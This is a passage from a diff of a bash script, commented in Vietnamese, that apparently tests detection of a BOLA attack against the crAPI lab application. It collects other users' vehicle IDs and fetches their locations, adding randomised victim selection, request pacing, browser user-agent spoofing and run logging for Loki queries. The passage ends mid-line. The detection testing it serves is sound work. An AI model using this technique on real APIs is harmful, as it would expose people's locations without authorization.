@@ -53,14 +53,33 @@ print("\n".join(seen))' "$ATTACKER_EMAIL")
 log "vehicleid của người khác lộ qua community/posts: ${#TARGETS[@]} (${TARGETS[*]})"
 [[ ${#TARGETS[@]} -ge 1 ]] || fail "không tìm thấy vehicleid nào của người khác qua community/posts — seed thiếu dữ liệu nạn nhân"
 
+# §B1: THỰC THI số nạn nhân. VICTIMS=n → chạm đúng n thực thể KHÁC NHAU (không chỉ
+# ghi nhãn). §B1b: LUÂN PHIÊN — xáo trộn POOL nạn nhân (toàn bộ vehicleid lộ ra)
+# rồi RÚT ngẫu nhiên VICTIMS cái; khác nhau giữa các lượt, không cố định. Danh
+# sách đã dùng ghi vào runs.jsonl (qua CRAPI_RUN_META) để kiểm rò rỉ danh tính sau.
+VICTIMS="${VP_VICTIMS:-${VICTIMS:-0}}"
+POOL_SIZE=${#TARGETS[@]}
+mapfile -t TARGETS < <(printf '%s\n' "${TARGETS[@]}" | shuf)   # luân phiên
+if [[ "$VICTIMS" -gt 0 ]]; then
+  [[ "$POOL_SIZE" -ge "$VICTIMS" ]] || fail "yêu cầu VICTIMS=$VICTIMS nhưng pool chỉ có $POOL_SIZE vehicleid — seed thêm nạn nhân (§B1b seed-job.yaml)"
+  TARGETS=("${TARGETS[@]:0:$VICTIMS}")
+fi
+log "§B1b: rút ${#TARGETS[@]} nạn nhân từ pool $POOL_SIZE (luân phiên): ${TARGETS[*]}"
+if [[ -n "${CRAPI_RUN_META:-}" ]]; then
+  printf 'victims_used=%s\n' "$(IFS=,; echo "${TARGETS[*]}")" >> "$CRAPI_RUN_META"
+  printf 'victim_pool_size=%s\n' "$POOL_SIZE" >> "$CRAPI_RUN_META"
+fi
+
 # Mốc [T0,T1] TƯỜNG MINH bao trọn đúng lưu lượng BOLA của lần chạy NÀY — dùng
 # để truy vấn Loki tất định (Phần 1.1 remediation 2026-09), không dùng cửa sổ
 # trượt "10 phút gần nhất" (phụ thuộc thời điểm gọi, ăn log của lần chạy khác
 # khi gọi lặp lại nhanh — đây là nguyên nhân gốc của FAIL=4 giả trước đó).
 T0="$(date +%s)"
-echo "---- BOLA requests (HTTP code) ----"
-reached=0
+echo "---- BOLA requests (HTTP code) — PACE=${PACE:-burst} ----"
+reached=0; _i=0; _n=${#TARGETS[@]}
 for u in "${TARGETS[@]}"; do
+  _i=$((_i + 1))
+  [[ $_i -gt 1 ]] && crapi_pace_sleep "$_i" "$_n"   # §B1: nhịp thật giữa các request
   path="/identity/api/v2/vehicle/${u}/location"
   body="$(curl -s -A "$BROWSER_UA" "${_tls_opts[@]}" -b "$J" --max-time 20 -w '\n%{http_code}' "$BFF_URL$path")"
   code="${body##*$'\n'}"; owner="$(printf '%s' "${body%$'\n'*}" | python3 -c 'import json,sys
